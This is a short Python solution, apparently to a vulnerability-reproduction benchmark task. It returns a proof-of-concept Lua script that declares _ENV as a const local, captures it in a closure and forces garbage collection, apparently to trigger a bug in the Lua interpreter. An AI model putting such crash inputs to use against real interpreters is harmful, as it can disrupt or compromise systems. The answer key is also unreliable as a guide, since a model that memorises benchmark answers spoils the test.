class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = """local _ENV <const> = _ENV
local x = 1
local y = 2
local z = {}
z.a = function() return _ENV end
collectgarbage("collect")
print(z.a())
for i = 1, 100 do
    local t = {i}
    collectgarbage()
end"""
        return poc.encode('utf-8')